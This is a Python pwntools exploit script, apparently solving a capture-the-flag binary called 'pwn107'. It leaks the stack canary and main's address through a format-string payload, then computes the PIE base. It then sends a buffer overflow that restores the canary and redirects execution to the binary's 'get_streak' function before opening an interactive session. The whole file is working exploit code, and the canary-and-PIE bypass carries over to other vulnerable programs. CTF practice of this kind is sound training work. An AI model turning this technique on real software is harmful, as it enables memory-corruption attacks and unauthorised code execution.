import pwn
import time

elf = pwn.context.binary = pwn.ELF("./pwn107.pwn107")
io = elf.process()
pwn.gdb.attach(io)
time.sleep(2)
io.recv(1000)

payloadLeakPayload = b"".join(
    [
        #Leak canary
        b"%13$lx.",
        #Leak address
        b"%17$lx"
    ]
)
#Parse the leak
io.sendline(payloadLeakPayload)
io.recvuntil(": ")
leaked = io.recvuntil("992")
leaked = leaked.split(b".")
canary = leaked[0]
mainAddr = leaked[1]
canary = int(canary,16)
mainAddr = int(mainAddr,16)
#Set base address
elf.address = mainAddr - elf.sym['main']

#Offsets
offsetToCanary = 24
offsetAfterCanary = 8

#Set addresses
retAddr = elf.address + 0x6fe
getStreakAddr = elf.sym['get_streak']

payload = b"".join(
    [
        #Buffer
        b"A"*offsetToCanary,
        #Canary
        pwn.p64(canary),
        #Buffer
        b"B"*offsetAfterCanary,
        #get_streak
        pwn.p64(retAddr),
        pwn.p64(getStreakAddr)
    ]
)

io.sendline(payload)
io.interactive()
